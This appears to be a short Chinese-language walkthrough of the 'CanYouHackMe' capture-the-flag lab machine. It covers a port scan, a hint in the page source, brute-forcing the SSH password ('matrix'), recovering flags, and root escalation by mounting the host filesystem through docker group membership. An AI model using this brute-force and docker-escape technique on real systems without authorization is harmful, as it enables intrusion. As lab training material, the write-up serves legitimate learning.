# CanYouHackMe

2025.02.28 https://thehackerslabs.com/canyouhackme/

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 web 跳转到 http://canyouhackme.thl/ ，将域名 canyouhackme.thl 添加到 hosts 中，扫描目录，没发现新的 url，查看页面源代码，发现：

```
Hola juan, te he dejado un correo importate, cundo puedas, leelo
```

得到用户名 juan 和 leelo，让 juan 看邮件。其他什么都没有，只好先爆 juan 的 ssh 登陆密码，等了很长一段时间得到了密码: matrix

登陆后，终端顶部到了 user flag：

```
44053c9499fe4672492a928bfbc4e21f
```

看一下 mail 什么都没有，但是在.bash_history 中发现操作记录：

```
juan@TheHackersLabs-CanYouHackMe:~$ cat .bash_history
rm .bash_history
cd /var/mail
ls
clear
cat para\ juan.txt
cat para\ root.txt
clear
docker run -it -v /:/mnt alpine
docker rm -f flamboyant_mclaren
docker rmi alpine
clear
docker run -it -v /:/mnt alpine
clear
su
exit
```

发现 juan 属于 docker 组，可以直接提权，拿到最终 root flag：

```
docker images

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# cat root.txt
233f3a6e802743abec7f5dcc311697a0
```
